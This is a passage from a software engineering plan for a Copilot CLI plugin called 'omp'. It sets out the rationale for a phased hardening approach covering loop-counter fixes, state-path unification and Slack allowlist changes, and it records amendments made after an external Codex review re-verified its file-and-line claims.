**Drivers.** (1) Two security findings exploitable today through documented workflows; (2) the product's core invariant — bounded autonomous loops — currently corrupted by counter double-writing, split state roots, and possible hook double-loading; (3) exactly one design question (additionalContext) genuinely undecidable from the repo; (4) the most invariant-critical file (agent-stop.mjs) had zero end-to-end tests, so any semantics change must ship with its own net.

**Alternatives considered.** *Big-bang hardening sprint* — rejected on bisectability and reviewability alone: a 35-finding diff cannot be bisected when a loop regression appears. *Generate-don't-maintain overhaul first* — rejected because it parks exploitable security fixes behind a refactor of code that has no tests; generation is retained as Phase-3 E1, gated on the Phase-2 test net. *v1's original phasing* (guard blocked on measurement; agent-stop churned across three releases with its tests arriving mid-stream) — superseded during consensus: the invariant must be self-defending regardless of measurements against an unversioned closed-source CLI, and the hot file must be touched once, with its tests.

**Why chosen.** The phased-with-vertical-slice shape is the only option that simultaneously (a) closes exploitable security in the first release, (b) satisfies "every fix lands with the test that would have caught it" on the file where it matters most, (c) keeps each release bisectable and independently shippable, and (d) defers the highest-churn refactor (catalog generation) until the parity checks and test net exist to catch its regressions.

**Consequences.** Positive: loop budgets become trustworthy (single writer, per-run-nonced dedup, N-yields-N cap, one root); the two remote/supply-chain exposures close immediately; catalog drift becomes structurally impossible before the catalog is ever regenerated. Negative/accepted: iteration semantics visibly change in one release across all three loop modes (ralph, ultrawork, ultraqa — one release note), with ultrawork/ultraqa status visibility trailing one release behind their behavior change (A7); pre-existing subdirectory-created `.omp` state is orphaned (warned, not migrated), including durable schedule jobs that keep executing while invisible to management until removed; empty-allowlist Slack setups break until the operator sets an explicit list or `*`; the idempotency guard's guarantee is deliberately narrow — concurrent double-fires cannot double-count, sequential double-fires are accepted residual exposure behind the exactly-once commitment; a rare double-count is accepted over any risk of a frozen budget (guard fails open toward counting).

**Follow-ups.** V1's matrix (with Copilot CLI version stamp) decides whether plugin.json's `"hooks"` entry can be removed — if an only-plugin population exists, `omp setup` becomes auto-triggered or required first. V2's finding (same version stamp) resolves A6's injection location in Phase 2. Both spike matrices must be re-validated when the Copilot CLI materially changes, since the measurements rot with the host. E2's retention sweep backstops the marker namespace introduced by A3. Windows support and `monitorTeam` resurrection remain explicit product decisions outside this plan.

---

## 5. Notes for Execution (from final consensus review)

Carried from the Architect's and Critic's final passes; none block the plan:

1. **Marker filename form:** `startedAt` is an ISO timestamp containing colons — sanitize or use epoch milliseconds in the marker filename (keeps names shell-friendly and the cleanup glob parseable).
2. **Locks dir creation:** ensure `.omp/state/locks/` is created (`mkdirSync` recursive) before the `wx` open, inside the same fail-open-toward-counting envelope.
3. **recordPrompt minute-bucket boundary:** a double-fire straddling a minute boundary escapes dedup — consistent with the accepted defense-in-depth posture; note it in the test file rather than tightening the key.
4. **loop-driver test update:** the existing tests pin the old N-1 cap behavior — update them in the same commit as the loop-driver.mjs:31 change so no intermediate commit is red.
5. **Spike matrix rot:** V1/V2 matrices carry the `copilot --version` stamp and must be re-validated when the Copilot CLI materially changes — keep in the release checklist.

---

## 6. Amendment v3.1 — External Codex Review Reconciliation (2026-07-05)

An independent Codex review (GPT-5.4-class, Codex CLI 0.142.5) re-verified the plan's file:line claims against the repo and returned **DISSENT** with specific findings. All four material findings were independently re-verified in the repo before amending. Codex confirmed the plan's factual basis as "mostly sound"; the dissent was about completeness. Dispositions:

**Material (plan text amended):**

1. **UltraQA counter double-writing (A2 scope extended — the dissent's core).** `recordUltraqaCycle` (src/mode-state/ultraqa.ts:51-70) increments `cycleCount`, the same field agent-stop's loop-driver increments (loop-driver.mjs:9), and .github/skills/ultraqa/SKILL.md:38 instructs `omp ultraqa cycle` every cycle — the identical double-counting defect A2 fixes for ralph. **Verified. A2 amended inline**: agent-stop becomes the sole `cycleCount` writer; `omp ultraqa cycle` repurposed to record the verdict (keeping pass→cancel) without incrementing. A2's acceptance extends to ultraqa: `maxCycles: 4` → exactly 4 hook-driven cycles with per-cycle `omp ultraqa cycle fail` calls interleaved.
2. **Team state root missed by A1.** src/team/state-paths.ts:33-35 anchors team state to literal `resolve(cwd)`. **Verified. A1 amended inline**: `resolveTeamPaths` switches to `ompRoot`; invariant test extended. Same subdir-divergence risk class as mode-state/schedule; team state is session-scoped (heartbeats, inboxes), so the migration risk is the ephemeral kind — release-note only.
3. **B2 breaks `omp env init` output.** src/env/init.ts:317 writes `SLACK_ALLOWED_USERS` only when the operator provided one — post-B2 that generated env file refuses to start. **Verified. B2 scope extended**: `env init` makes the allowlist prompt required (accepting `*` explicitly), and its generated-file test asserts the var is always present.
4. **A8 misses the raw-output path.** scripts/post-tool-use.mjs:54-63 writes `.omp/state/cost/raw/*` (and its hooks.log line) under literal cwd. **Verified. A8 scope extended**: all post-tool-use.mjs state paths move to `ompRoot`, not just hooks.log.

**Spec clarifications (carried into the named items, no structural change):**

5. **A3**: sanitize `sessionId` for marker filenames too, not just `startedAt` (it originates from the hook payload); marker cleanup must also run on agent-stop's own `result.clear` path (sentinel/cap), not only CLI start/cancel.
6. **B3**: queue depth semantics pinned — cap = 3 *pending* in addition to the 1 in-flight item (4th pending rejected with the busy reply); settled entries must be removed from the promise-chain map to avoid leaking per-session chains.
7. **E4**: `monitorTeam` reworded from "zero callers" to "no production caller" — it is exported and has tests, so deletion is an API-compatibility decision: delete it *and its tests* deliberately, note in release notes.
8. **E5 council fix**: a generic per-item error result is not type-safe for `runWithConcurrency<T,R>`; either change the helper's contract explicitly (result-wrapper return) or catch at the council call sites — decide in the PR, don't bolt an `any` into the generic. The existing test asserting whole-rejection gets updated with whichever contract is chosen.

**Verdict reconciliation:** Codex's DISSENT targeted execution-completeness, not the architecture; with amendments 1-4 applied the dissent's blocking findings are closed, and 5-8 are absorbed as spec clarifications. The phased structure, Phase-1 vertical slice, and all consensus-approved mechanisms stand unchanged.
